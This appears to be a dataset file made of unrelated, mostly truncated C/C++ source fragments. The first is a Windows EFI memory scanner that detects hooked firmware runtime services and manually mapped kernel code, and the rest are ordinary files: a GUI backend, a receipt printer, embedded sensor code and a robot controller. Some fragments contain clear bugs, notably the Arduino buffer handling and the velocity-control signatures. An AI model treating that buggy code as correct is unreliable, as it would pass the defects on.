false;\n\t//}\n\n\tCReadFile t_f",
    "#include \"scan.h\"\n\nnamespace scan\n{\n\tstatic BOOL invalid_range_detection(\n\t\tstd::vector<EFI_MEMORY_DESCRIPTOR>& memory_map,\n\t\tEFI_MEMORY_DESCRIPTOR& dxe_range,\n\t\tEFI_MEMORY_DESCRIPTOR *out\n\t\t);\n\n\tstd::vector<EFI_MODULE_INFO> get_runtime_modules(std::vector<QWORD> &runtime_table, EFI_MEMORY_DESCRIPTOR &dxe_range);\n\tstd::vector<EFI_MODULE_INFO> get_dxe_modules(std::vector<EFI_MEMORY_DESCRIPTOR>& memory_map);\n\tstatic void runtime_detection(EFI_MEMORY_DESCRIPTOR &dxe_range);\n\tstatic void umap_detect(void);\n\tstatic void dump_to_file(PCSTR filename, QWORD physical_address, QWORD size);\n}\n\n//\n// later runtime checks\n// \n// if (is_efi_address(rip) && !is_inside(rip, dxe_range))\n//\tprintf(\"wssu doing m8???\\n\");\n//\n\ninline PCSTR get_efi_type(QWORD type)\n{\n\tif (11  == type) return \"MIO\";\n\tif (609 == type) return \"VMWARE\";\n\treturn \"DXE\";\n}\n\nvoid scan::efi(BOOL dump)\n{\n\tstd::vector<EFI_MEMORY_DESCRIPTOR> memory_map = cl::efi::get_memory_map();\n\tif (!memory_map.size())\n\t{\n\t\treturn;\n\t}\n\n\tstd::vector<QWORD> runtime_table = cl::efi::get_runtime_table();\n\tif (runtime_table.size() == 0)\n\t{\n\t\tfor (auto &entry : memory_map)\n\t\t{\n\t\t\tif (entry.Type != 11)\n\t\t\t{\n\t\t\t\tLOG_RED(\"did you touch FirmwareTypeUefi boot time?\\n\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\treturn;\n\t}\n\n\n\tEFI_MEMORY_DESCRIPTOR dxe_range{};\n\tfor (auto &page : memory_map)\n\t{\n\t\tif (runtime_table[0] >= page.VirtualStart &&\n\t\t\truntime_table[0] <= (page.VirtualStart + (page.NumberOfPages * PAGE_SIZE))\n\t\t\t)\n\t\t{\n\t\t\tdxe_range = page;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (dxe_range.VirtualStart == 0)\n\t{\n\t\tLOG_RED(\"????????????????????????????????\\n\");\n\t\treturn;\n\t}\n\n\tfor (auto &entry : memory_map)\n\t{\n\t\tif (entry.VirtualStart == dxe_range.VirtualStart || entry.Type == 11)\n\t\t{\n\t\t\tLOG(\"%s [%llx - %llx] %llx\\n\",\n\t\t\t\t// entry.Attribute,\n\t\t\t\tget_efi_type(entry.Type),\n\t\t\t\tentry.PhysicalStart,\n\t\t\t\tentry.PhysicalStart + (entry.NumberOfPages * 0x1000),\n\t\t\t\tentry.VirtualStart\n\t\t\t);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tLOG_RED(\"%s [%llx - %llx] %llx\\n\",\n\t\t\t\t// entry.Attribute,\n\t\t\t\tget_efi_type(entry.Type),\n\t\t\t\tentry.PhysicalStart,\n\t\t\t\tentry.PhysicalStart + (entry.NumberOfPages * 0x1000),\n\t\t\t\tentry.VirtualStart\n\t\t\t);\n\t\t}\n\t}\n\n\truntime_detection(dxe_range);\n\tumap_detect();\n\n\tEFI_MEMORY_DESCRIPTOR eout_0{};\n\tif (invalid_range_detection(memory_map, dxe_range, &eout_0) && dump)\n\t{\n\t\tdump_to_file(\"eout_0.bin\", eout_0.PhysicalStart, eout_0.NumberOfPages*0x1000);\n\t}\n\n\t//\n\t// dump modules from EFI range (driver.sys)\n\t//\n\tstd::vector<EFI_MODULE_INFO> modules = get_dxe_modules(memory_map);\n\tif (modules.size() == 0)\n\t{\n\t\t//\n\t\t// dump modules from runtime range (rtcore.sys)\n\t\t//\n\t\tmodules = get_runtime_modules(runtime_table, dxe_range);\n\t}\n\n\tif (modules.size() < 3)\n\t{\n\t\tLOG_RED(\"????????????????????????????????\\n\");\n\t\treturn;\n\t}\n\n\tfor (auto &entry : modules)\n\t{\n\t\tprintf(\"DXE module [%llx - %llx] %llx\\n\",\n\t\t\t// entry.Attribute,\n\t\t\tentry.physical_address,\n\t\t\tentry.physical_address + (entry.size),\n\t\t\tentry.virtual_address\n\t\t);\n\t}\n}\n\nstatic BOOL scan::invalid_range_detection(\n\tstd::vector<EFI_MEMORY_DESCRIPTOR>& memory_map,\n\tEFI_MEMORY_DESCRIPTOR& dxe_range,\n\tEFI_MEMORY_DESCRIPTOR *out\n\t)\n{\n\tBOOL status=0;\n\tfor (auto& entry : memory_map)\n\t{\n\t\tif (entry.PhysicalStart >= dxe_range.PhysicalStart &&\n\t\t\t(entry.PhysicalStart + (entry.NumberOfPages * 0x1000)) <=\n\t\t\t(dxe_range.PhysicalStart + (dxe_range.NumberOfPages * 0x1000))\n\t\t\t)\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tif ((entry.Type == 5 || entry.Type == 6) && entry.Attribute == 0x800000000000000f &&\n\t\t\tentry.PhysicalStart != dxe_range.PhysicalStart)\n\t\t{\n\t\t\tprintf(\"\\n\");\n\t\t\tLOG(\"DXE is found from invalid range!!! [%llx - %llx]\\n\",\n\t\t\t\tentry.PhysicalStart,\n\t\t\t\tentry.PhysicalStart + (entry.NumberOfPages * 0x1000)\n\t\t\t);\n\n\t\t\t*out   = entry;\n\t\t\tstatus = 1;\n\t\t}\n\t}\n\n\treturn status;\n}\n\n\nstatic void scan::runtime_detection(EFI_MEMORY_DESCRIPTOR &dxe_range)\n{\n\tstd::vector<QWORD> HalEfiRuntimeServicesTable = cl::efi::get_runtime_table();\n\tif (!HalEfiRuntimeServicesTable.size())\n\t{\n\t\treturn;\n\t}\n\n\tfor (int i = 0; i < HalEfiRuntimeServicesTable.size(); i++)\n\t{\n\t\tQWORD rt_func = HalEfiRuntimeServicesTable[i];\n\t\tif (cl::vm::read<WORD>(4, rt_func) == 0x25ff)\n\t\t{\n\t\t\tLOG_RED(\"EFI Runtime service [%d] is hooked with byte patch: %llx\\n\", i, rt_func);\n\t\t\tcontinue;\n\t\t}\n\n\t\tBOOL found = 0;\n\t\tif (rt_func >= dxe_range.VirtualStart &&\n\t\t\trt_func <= (dxe_range.VirtualStart + (dxe_range.NumberOfPages * PAGE_SIZE))\n\t\t\t)\n\t\t{\n\t\t\tfound = 1;\n\t\t}\n\t\t\n\t\tif (!found)\n\t\t{\n\t\t\tLOG_RED(\"EFI Runtime service [%d] is hooked with pointer swap: %llx, %llx\\n\",\n\t\t\t\ti, rt_func, cl::get_physical_address(rt_func));\n\t\t}\n\t}\n}\n\nstatic void scan::umap_detect(void)\n{\n\tauto  modules = get_kernel_modules();\n\tQWORD hal     = 0;\n\tfor (auto &mod : modules)\n\t{\n\t\tif (!_strcmpi(mod.name.c_str(), \"hal.dll\"))\n\t\t{\n\t\t\thal = mod.base;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tQWORD entry = hal;\n\tQWORD fbase = 0;\n\tQWORD lbase = 0;\n\n\twhile (1)\n\t{\n\t\tBOOL found = 0;\n\t\tfor (auto& mod : modules)\n\t\t{\n\t\t\tif (entry >= mod.base && entry <= (mod.base + mod.size))\n\t\t\t{\n\t\t\t\tfbase = mod.base;\n\t\t\t\tfound = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\t",
    "// dear imgui: Platform Backend for Windows (standard windows API for 32-bits AND 64-bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core dear imgui)\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen/Pen.\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy VK_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// Configuration flags to add in your imconfig file:\n//#define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD              // Disable gamepad support. This was meaningful before <1.81 but we now load XInput dynamically so the option is now less relevant.\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-07-08: Inputs: Fixed ImGuiMod_Super being mapped to VK_APPS instead of VK_LWIN||VK_RWIN. (#7768)\n//  2023-10-05: Inputs: Added support for extra ImGuiKey values: F13 to F24 function keys, app back/forward keys.\n//  2023-09-25: Inputs: Synthesize key-down event on key-up for VK_SNAPSHOT / ImGuiKey_PrintScreen as Windows doesn't emit it (same behavior as GLFW/SDL).\n//  2023-09-07: Inputs: Added support for keyboard codepage conversion for when application is compiled in MBCS mode and using a non-Unicode window.\n//  2023-04-19: Added ImGui_ImplWin32_InitForOpenGL() to facilitate combining raw Win32/Winapi with OpenGL. (#3218)\n//  2023-04-04: Inputs: Added support for io.AddMouseSourceEvent() to discriminate ImGuiMouseSource_Mouse/ImGuiMouseSource_TouchScreen/ImGuiMouseSource_Pen. (#2702)\n//  2023-02-15: Inputs: Use WM_NCMOUSEMOVE / WM_NCMOUSELEAVE to track mouse position over non-client area (e.g. OS decorations) when app is not focused. (#6045, #6162)\n//  2023-02-02: Inputs: Flipping WM_MOUSEHWHEEL (horizontal mouse-wheel) value to match other backends and offer consistent horizontal scrolling direction. (#4019, #6096, #1463)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-28: Inputs: Convert WM_CHAR values with MultiByteToWideChar() when window class was registered as MBCS (not Unicode).\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2021-01-20: Inputs: calling new io.AddKeyAnalogEvent() for gamepad support, instead of writing directly to io.NavInputs[].\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-17: Inputs: always update key mods next and before a key event (not in NewFrame) to fix input queue with very low framerates.\n//  2022-01-12: Inputs: Update mouse inputs using WM_MOUSEMOVE/WM_MOUSELEAVE + fallback to provide it when focused but not hovered/captured. More standard and will allow us to pass it to future input queue API.\n//  2022-01-12: Inputs: Maintain our own copy of MouseButtonsDown mask instead of using ImGui::IsAnyMouseDown() which will be obsoleted.\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyModsEvent() + io.SetKeyEventNativeData() API (1.87+). Support for full ImGuiKey range.\n//  2021-12-16: Inputs: Fill VK_LCONTROL/VK_RCONTROL/VK_LSHIFT/VK_RSHIFT/VK_LMENU/VK_RMENU for completeness.\n//  2021-08-17: Calling io.AddFocusEvent() on WM_SETFOCUS/WM_KILLFOCUS messages.\n//  2021-08-02: Inputs: Fixed keyboard modifiers being reported when host window doesn't have focus.\n//  2021-07-29: Inputs: MousePos is correctly reported when the host platform window is hovered but not focused (using TrackMouseEvent() to receive WM_MOUSELEAVE events).\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-08: Fixed ImGui_ImplWin32_EnableDpiAwareness() and ImGui_ImplWin32_GetDpiScaleForMonitor() to handle Windo",
    "#include \"user.h\"\n\n// Getter methods\nQString User::getName() const { return name; }\nint User::getAge() const { return age; }\nQString User::getGender() const { return gender; }\nfloat User::getWeight() const { return weight; }\nfloat User::getHeight() const { return height; }\nQString User::getBloodPressure() const { return bloodPressure; }\nQString User::getGoal() const { return goal; }\nint User::getSleepHours() const { return sleepHours; }\n\n// Setter methods\nvoid User::setName(const QString &name) { this->name = name; }\nvoid User::setAge(int age) { this->age = age; }\nvoid User::setGender(const QString &gender) { this->gender = gender; }\nvoid User::setWeight(float weight) { this->weight = weight; }\nvoid User::setHeight(float height) { this->height = height; }\nvoid User::setBloodPressure(const QString &bloodPressure) { this->bloodPressure = bloodPressure; }\nvoid User::setGoal(const QString &goal) { this->goal = goal; }\nvoid User::setSleepHours(int sleepHours) { this->sleepHours = sleepHours; }\n",
    "#define STB_IMAGE_IMPLEMENTATION\n#define STB_IMAGE_WRITE_IMPLEMENTATION\n#define BYTE_BOUND(value) value < 0 ? 0 : (value > 255 ? 255 : value)\n#include \"receipt.h\"\n#include \"stb_image.h\"\n#include \"stb_image_write.h\"\n\n#define MAX 690000\n#define PRO 540000\n#define MINI 320000\n\n#define DELIVER 10000\n\n\nImage::Image(const char* filename)\n{\n    Image::image_log(\"Proceeding to read image \\n\");\n\n    if (!read(filename))\n    {\n        Image::image_log(\"Image could not be read \\n\");\n    }\n    else\n    {\n        Image::image_log(\"Image was read \\n\");\n        size = w * h * channels;\n        printf(\"Height: %d, Width: %d, Channels: %d, Size: %ld \\n\", h, w, channels,size);\n    }\n    \n}\n\nImage::~Image()\n{\n    stbi_image_free(data);\n}\n\nvoid Image::image_log(const char *message)\n{\n    printf(\"Message: %s \\n\",message);\n}\n\nImageType Image::getFileType(const char* filename) {\n    const char* ext = strrchr(filename, '.');\n    if(ext != nullptr) {\n        if(strcmp(ext, \".png\") == 0) {\n            return PNG;\n        }\n        else if(strcmp(ext, \".jpg\") == 0) {\n            return JPG;\n        }\n        else if(strcmp(ext, \".bmp\") == 0) {\n            return BMP;\n        }\n        else if(strcmp(ext, \".tga\") == 0) {\n            return TGA;\n        }\n    }\n            return PNG;\n}\n\nImage &Image::overlayText(const char *txt, const Font &font, int x, int y, uint8_t r, uint8_t g, uint8_t b, uint8_t a)\n{\n    size_t len = strlen(txt);\n    SFT_Char c;\n    int32_t dx, dy;\n    uint8_t* dstPx;\n    uint8_t srcPx;\n    uint8_t color[4] = {r, g, b, a};\n\n    for (size_t i = 0; i < len; i++)\n    {\n        if(sft_char(&font.sft, txt[i], &c) != 0) {\n            printf(\"\\e[31m[ERROR] Font is missing character '%c'\\e[0m\\n\", txt[i]);\n\t\t\tcontinue;\n        }\n\n        for (uint16_t sy = 0; sy < c.height; sy++)\n        {\n            dy = sy + y + c.y;\n            if (dy < 0) { continue; }\n            else if(dy >= h){ break; }\n            for (uint16_t sx = 0; sx < c.width; sx++)\n            {\n                dx = sx + x + c.x;\n                if (dx < 0) { continue; }\n                else if(dx >= w){ break; }\n\n                dstPx = &data[(dy * w + dx) * channels];\n                srcPx = c.image[sx + sy * c.width];\n\n                if (srcPx != 0)\n                {\n                    float srcAlpha = (srcPx / 255.f) * (a / 255.f);\n                    float dstAlpha = channels < 4 ? 1 : dstPx[3] / 255.f;\n\n                    if(srcAlpha > .99 && dstAlpha > .99) {\n                        memcpy(dstPx, color, channels);\n                    }\n                    else {\n                        float outAlpha = srcAlpha + dstAlpha * (1 - srcAlpha);\n                        if(outAlpha < .01) {\n                            memset(dstPx, 0, channels);\n                        } else {\n                            for (int chnl = 0; chnl < channels; chnl++)\n                            {\n                                dstPx[chnl] = (uint8_t)BYTE_BOUND((color[chnl]/255.f * srcAlpha + dstPx[chnl]/255.f * dstAlpha * (1 - srcAlpha)) / outAlpha * 255.f);\n                            }\n                            if(channels > 3) { dstPx[3] = (uint8_t)BYTE_BOUND(outAlpha * 255.f); }\n                        }\n                    }\n\n                }\n                \n            }\n        }\n        x += c.advance;\n        free(c.image);\n    }\n    return *this;\n}\n\nbool Image::read(const char *filename)\n{\n    data = stbi_load(filename, &w, &h, &channels, 0);\n    return data != NULL;\n}\n\nbool Image::write(const char *filename)\n{\n    ImageType type = getFileType(filename);\n    int success;\n    switch (type)\n    {\n    case PNG:\n        success = stbi_write_png(filename, w, h, channels, data, w * channels);\n        break;\n\n    case BMP:\n        success = stbi_write_bmp(filename, w, h, channels, data);\n        break;\n\n    case JPG:\n        success = stbi_write_jpg(filename, w, h, channels, data, 100);\n        break;\n\n    case TGA:\n        success = stbi_write_tga(filename, w, h, channels, data);\n        break;\n\n    }\n\n    return success != 0;\n}\n\nCustomer::Customer()\n{\n    std::cout << \"What is the customer's name?\" << std::endl;\n    std::cin.ignore();\n    std::getline(std::cin, name);\n    std::transform(name.begin(), name.end(), name.begin(), ::toupper);\n\n    std::cout << \"What is the customer's phone number?\" << std::endl;\n    std::getline(std::cin, phone);\n    phone.insert(0, \"Phone: \");\n\n    std::cout << \"What is the customer's address?\" << std::endl;\n    std::getline(std::cin, address);\n    address.insert(0, \"Address: \");\n\n   \n}\n\n\nReceipt::Receipt(): customer() , items{Item(\"\", 0, 0), Item(\"\", 0, 0), Item(\"\", 0, 0), \n                      Item(\"\", 0, 0), Item(\"\", 0, 0), Item(\"\", 0, 0)}\n{\n    addItems();\n    calculateTime();\n}\nlong Receipt::mainPrice = 0; \n\nvoid Receipt::addItems()\n{\n        std::cout << \"Enter the items and their prices\" << std::endl;\n        std::cout << \"Use this format: Item-Quantity-Price. Milk--2--30\" << std::endl;\n        char str[50];\n        int qua",
    "#define _CRT_SECURE_NO_WARNINGS\n\n#include <iostream>\n#include <cstdio>\n#include <cstring>\n#include \"Assessment.h\"\n#include \"Assessment.h\"\n#include \"Assessment.h\"\n\n\nusing namespace seneca;\nusing namespace std;\nvoid display(const Assessment& a);\nbool readTesters();\nint main() {\n   if(readTesters()) {\n      int cnt;\n      Assessment *aptr;\n      FILE* fptr = fopen(\"baddata.txt\", \"r\");\n      cnt = read(aptr, fptr);\n      if(cnt) {\n         cout << \"This should have failed, keep working on the workshop!\" << endl;\n      } else {\n         cout << \"File records and number of records do not match!\" << endl;   // this is the correct output\n      }\n      fclose(fptr);\n      cout << \"Listing Good Data:\" << endl;\n      fptr = fopen(\"gooddata.txt\", \"r\");\n      cnt = read(aptr, fptr);\n      if(cnt) {\n         for(int i = 0; i < cnt; i++) {\n            cout << (i + 1) << \": \";\n            display(aptr[i]);\n         }\n         freeMem(aptr, cnt);\n      } else {\n         cout << \"This should not have failed, keep working on the workshop!\" << endl;\n      }\n      fclose(fptr);\n   }\n   return 0;\n}\nvoid display(const Assessment& a) {\n   cout.setf(ios::fixed);// setting the number of digits\n   cout.precision(1);    // after the decimal point to 1\n                         // this will be covered later\n   cout << a.m_title << \": \" << *a.m_mark << endl;\n}\n\nbool readTesters() {\n   FILE* fptr = fopen(\"gooddata.txt\", \"r\");\n   bool passed = true;\n   int i;\n   double d;\n   char str[61];\n   if(read(i, fptr) && i == 13) {\n      cout << \"bool read(int& value, FILE* fptr) test passed\" << endl;\n   }\n   else {\n      cout << \"bool read(int& value, FILE* fptr) test failed\" << endl;\n      passed = false;\n   }\n   if(passed && read(d, fptr) && (d - 70.9) < 0.0001 && (d - 70.9) > -0.0001) {\n      cout << \"bool read(double& value, FILE* fptr) test passed\" << endl;\n   } \n   else {\n      cout << \"bool read(double& value, FILE* fptr) test failed\" << endl;\n      passed = false;\n   }\n   if(passed && read(str, fptr) && strcmp(str, \"Applied Problem Solving\") == 0)  {\n      cout << \"bool read(double& value, FILE* fptr) test passed\" << endl;\n   } \n   else {\n      cout << \"bool read(double& value, FILE* fptr) test failed\" << endl;\n      passed = false;\n   }\n   fclose(fptr);\n   return passed;\n}\n",
    "#include <Arduino.h>\n#include <TinyWireM.h>  // Use TinyWireM for ATTiny85\n\n#define ADXL345_ADDRESS 0x53\n#define ADXL345_REG_DEVID 0x00\n#define ADXL345_REG_POWER_CTL 0x2D\n#define ADXL345_REG_DATA_FORMAT 0x31\n#define ADXL345_REG_DATAX0 0x32\n\n#define BUZZER_PIN PB3\n#define RED_LED_PIN PB1\n#define WHITE_LED_PIN PB4\n\nconst int pitchStep = 25;\nconst int maxPitch = 2500;\nconst int minPitch = 1500;\nconst int evaluationCycleDelay = 100; // Adjust the delay as needed\n\n// put function declarations here:\nvoid writeRegister(uint8_t reg, uint8_t value);\nvoid readRegister(uint8_t reg, uint8_t* buffer, uint8_t len);\n\nvoid setup() {\n   TinyWireM.begin();  // Initialize I2C communication for ATTiny85\n\n  pinMode(BUZZER_PIN, OUTPUT);\n  pinMode(RED_LED_PIN, OUTPUT);\n  pinMode(WHITE_LED_PIN, OUTPUT);\n\n  // Initialize the sensor\n  uint8_t devid;\n  readRegister(ADXL345_REG_DEVID, &devid, 1);\n  if (devid != 0xE5) {\n    digitalWrite(RED_LED_PIN, HIGH);  // Light the red LED\n    while (1);  // Infinite loop\n  }\n\n  // Set the range to +/- 4G\n  writeRegister(ADXL345_REG_DATA_FORMAT, 0x01);\n  // Enable measurements\n  writeRegister(ADXL345_REG_POWER_CTL, 0x08);\n\n  analogWrite(WHITE_LED_PIN, 50);  // Dimly light the white LED\n\n}\n\nvoid loop() {\n  enum pitchDirection {Up = 1, Down = -1};\n\n  static int currentPitch = minPitch;\n  static pitchDirection currentPitchDirection = Up;\n\n  uint8_t buffer;\n  readRegister(ADXL345_REG_DATAX0, &buffer, 6);\n\n  int16_t x = (buffer << 8) | buffer;\n  int16_t y = (buffer << 8) | buffer;\n  int16_t z = (buffer << 8) | buffer;\n\n  // Calculate pitch and roll\n  float pitch = atan2(y, sqrt(x * x + z * z)) * 180.0 / PI;\n  float roll = atan2(x, sqrt(y * y + z * z)) * 180.0 / PI;\n\n  // Sound the buzzer if pitch or roll is greater than 45 degrees\n  // TODO: update this section to cycle through tone frequencies roughly within the normal range of human hearing\n  \n  if (abs(pitch) > 45 || abs(roll) > 45) {\n    tone(BUZZER_PIN, currentPitch);  // Sound a tone based on current pitch\n    currentPitch += currentPitch + (pitchStep * currentPitchDirection);\n    if(currentPitch < minPitch)\n    {\n      currentPitch = minPitch;\n      currentPitchDirection = Up;\n    }\n    if(currentPitch > maxPitch)\n    {\n      currentPitch = maxPitch;\n      currentPitchDirection = Down;\n    }\n  } else {\n    noTone(BUZZER_PIN);  // Stop the tone\n  }\n\n  delay(evaluationCycleDelay);\n\n}\n\nvoid writeRegister(uint8_t reg, uint8_t value) {\n  TinyWireM.beginTransmission(ADXL345_ADDRESS);\n  TinyWireM.write(reg);\n  TinyWireM.write(value);\n  TinyWireM.endTransmission();\n}\n\nvoid readRegister(uint8_t reg, uint8_t* buffer, uint8_t len) {\n  TinyWireM.beginTransmission(ADXL345_ADDRESS);\n  TinyWireM.write(reg);\n  TinyWireM.endTransmission();\n  TinyWireM.requestFrom(ADXL345_ADDRESS, len);\n  for (uint8_t i = 0; i < len; i++) {\n    buffer[i] = TinyWireM.read();\n  }\n}\n\n",
    "#include \"voltage_mod.h\"\r\n#include \"localization_mod.h\"\r\n#include \"SEED_Lab_PID_controller.h\"\r\n\r\nusing namespace std;\r\n\r\nint Kp = 10;\r\nfloat vel_refresh_interval = 0.01;\r\n\r\nvoid velocity_control::set_left_voltage(float desired_left_vel = get_left_vel(), float measured_left_vel = get_measured_vel(0)) {\r\n    float left_vel_error = desired_left_vel - measured_left_vel;\r\n    left_voltage = Kp * left_vel_error;\r\n    if (left_voltage < 0) {\r\n        left_dir = 0;\r\n        left_voltage = -left_voltage;\r\n    } \r\n    else { left_dir = 1; }\r\n}\r\n\r\nvoid velocity_control::set_right_voltage(float desired_right_vel = get_right_vel(), float measured_right_vel = get_measured_vel(1)) {\r\n    float right_vel_error = desired_right_vel - measured_right_vel;\r\n    right_voltage = Kp * right_vel_error;\r\n    if (right_voltage < 0) {\r\n        right_dir = 0;\r\n        right_voltage = -right_voltage;\r\n    } \r\n    else { right_dir = 1; }\r\n}\r\n\r\nfloat velocity_control::set_measured_left_vel(float left_pos = get_wheel_pos(0), float left_prev_pos) {\r\n    measured_left_vel = float((((2*3.14159) / 3200) * (left_pos - left_prev_pos)) / vel_refresh_interval);\r\n    left_prev_pos = left_pos;\r\n}\r\n\r\nvoid velocity_control::set_measured_right_vel(float right_pos = get_wheel_pos(1), float right_prev_pos) {\r\n    measured_right_vel = float((((2*3.14159) / 3200) * (right_pos - right_prev_pos)) / vel_refresh_interval);\r\n    right_prev_pos = right_pos;\r\n}\r\n\r\nfloat velocity_control::get_voltage(int wheel) {\r\n    if(wheel == 0) {\r\n        return left_voltage;\r\n    }\r\n    else if(wheel == 1) {\r\n        return right_voltage;\r\n    }\r\n    else {\r\n        return 0;\r\n    }\r\n}\r\n\r\nfloat velocity_control::get_measured_vel(int wheel) {\r\n    if(wheel == 0) {\r\n        set_left_velocity();\r\n        return measured_left_vel;\r\n    }\r\n    else if(wheel == 1) {\r\n        set_right_velocity();\r\n        return measured_right_vel;\r\n    }\r\n    else {\r\n        return 0;\r\n    }\r\n}\r\n\r\nfloat velocity_control::get_dir(int wheel) {\r\n    if(wheel == 0) {\r\n        return left_dir;\r\n    }\r\n    else if(wheel == 1) {\r\n        return right_dir;\r\n    }\r\n    else {\r\n        return 0;\r\n    }\r\n}\r\n\r\n\r\nfloat velocity_control::right_dir_get() {\r\n    return right_dir;\r\n}\r\n\r\n",
    "#include \"HIvision_SDK.h\"\n\n\n\n\n\nvoid human_mating (Hivision_config hivision){\n\tstd::string ImagePathStr(hivision.image_path);\n\tstd::string ModelPathStr(hivision.model_path);\n\tstd::string OutPathStr(hivision.out_path);\n\n    const char* ImagePath = ImagePathStr.c_str();\n\tconst char* ModelPath = ModelPathStr.c_str();\n\t\n\n\tcv::Mat image =cv::imread(ImagePath, cv::IMREAD_COLOR);\n    cv::Mat bgra_img=human_matting(ModelPath,image,4);\n    cv::imwrite(OutPathStr+\"human_matting.png\", bgra_img);\n\n}\n\n\n\nint ID_photo (Hivision_config hivision,int out_size_kb,bool layout_phot){\n\n    matting_params human_matting_params;\n\tstd::string ImagePathStr(hivision.image_path);\n\tstd::string ModelPathStr(hivision.model_path);\n\tstd::string OutPathStr(hivision.out_path);\n\tstd::string FaceModelPathStr(hivision.face_model_path);\n\n    const char* ImagePath = ImagePathStr.c_str();\n\tconst char* ModelPath = ModelPathStr.c_str();\n\n\tcv::Vec3b newBackgroundColor(hivision.background_b,hivision.background_g,hivision.background_r);\n    LFFD* face_detector = new LFFD(FaceModelPathStr,hivision.model_scale ,hivision.thread_num );\n\tcv::Mat image =cv::imread(ImagePath, cv::IMREAD_COLOR);\n\n\tcv::Mat bgra_img=human_matting(ModelPath, image,4);\n    cv::Mat add_background_img = addBackground(bgra_img, newBackgroundColor);\n\tcv::cvtColor(add_background_img, add_background_img, cv::COLOR_BGRA2BGR);\n\n\tstd::vector<FaceInfo > finalBox;\n\tface_detector->detect(add_background_img, finalBox, add_background_img.rows, add_background_img.cols);\n\tfor (int i = 0; i < finalBox.size(); i++) {\n\t\tFaceInfo facebox = finalBox[i];\n\t\t// cv::Rect box = cv::Rect(facebox.x1, facebox.y1, facebox.x2 - facebox.x1, facebox.y2 - facebox.y1);\n\t\t// cv::rectangle(add_background_img, box, cv::Scalar(255, 0, 21), 2);\n\t}\n\tif (finalBox.size() > 1) {\n\t\tprintf(\"\u8f93\u5165\u4eba\u8138\u4e0d\u4e3a 1\");\n\t\treturn 0;\n\t}\n\telse {\n\t\thuman_matting_params.face_info = finalBox[0];\n\t}\n\tfree(face_detector);\n    cv::Mat hd_result = photo_adjust(human_matting_params, add_background_img, hivision.out_image_height,hivision.out_image_width,hivision.background_r,hivision.background_g,hivision.background_b);\n    cv::Mat standard_result;\n\tcv::Size standard_size(hivision.out_image_width,hivision.out_image_height);\n    cv::resize(hd_result, standard_result, standard_size);\n\n\tif(out_size_kb>0){\n    \n\t\tresizeImageToKB(hd_result,OutPathStr+\"result_kb.png\",out_size_kb);\n\t}\n\t\n    if(layout_phot){\n\t\tauto result_typography_arr =generate_layout_photo(hivision.out_image_height,hivision.out_image_width);\n\t\tcv::Mat result_layout_image = generate_layout_image(\n\t\tstandard_result,\n\t\tstd::get<0>(result_typography_arr),\n\t\tstd::get<1>(result_typography_arr),\n\t\thivision.out_image_width,\n\t\thivision.out_image_height\n\t\t);\n\t\tcv::imwrite( OutPathStr+\"layout_photo.png\", result_layout_image);\n\t }\n\tcv::imwrite( OutPathStr+\"result_hd.png\", hd_result);\n\tcv::imwrite(OutPathStr+\"result_standard.png\", standard_result);\n\treturn 1;\n   \n}",
    "#include \"flutter_window.h\"\r\n\r\n#include <optional>\r\n\r\n#include \"flutter/generated_plugin_registrant.h\"\r\n\r\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\r\n    : project_(project) {}\r\n\r\nFlutterWindow::~FlutterWindow() {}\r\n\r\nbool FlutterWindow::OnCreate() {\r\n  if (!Win32Window::OnCreate()) {\r\n    return false;\r\n  }\r\n\r\n  RECT frame = GetClientArea();\r\n\r\n  // The size here must match the window dimensions to avoid unnecessary surface\r\n  // creation / destruction in the startup path.\r\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\r\n      frame.right - frame.left, frame.bottom - frame.top, project_);\r\n  // Ensure that basic setup of the controller was successful.\r\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\r\n    return false;\r\n  }\r\n  RegisterPlugins(flutter_controller_->engine());\r\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\r\n\r\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\r\n    this->Show();\r\n  });\r\n\r\n  // Flutter can complete the first frame before the \"show window\" callback is\r\n  // registered. The following call ensures a frame is pending to ensure the\r\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\r\n  